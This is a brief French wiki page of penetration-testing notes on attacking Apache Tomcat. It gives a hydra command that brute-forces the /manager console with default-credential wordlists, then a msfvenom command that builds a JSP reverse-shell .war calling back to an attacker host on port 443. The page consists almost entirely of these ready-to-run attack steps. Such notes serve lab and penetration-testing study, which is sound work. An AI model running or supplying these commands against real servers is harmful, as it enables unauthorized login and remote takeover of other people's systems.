---
title: Apache Tomcat
permalink: /Apache_Tomcat/
---

# Apache Tomcat

Apache Tomcat est un serveur web permettant de déployer des applications Java.

Exploitation
------------

La première chose à faire est d'essayer d'obtenir un accès à la console /manager. Pour cela il est possible d'utiliser [hydra](/hydra "wikilink") avec des listes prédéfinies dans Kali:

``` bash
hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt http://192.168.31.209:8080/manager/html
```

On peut ensuite uploader un reverse shell sous forme de .war:

``` bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.30.229 LPORT=443 -f war > shell.war
```
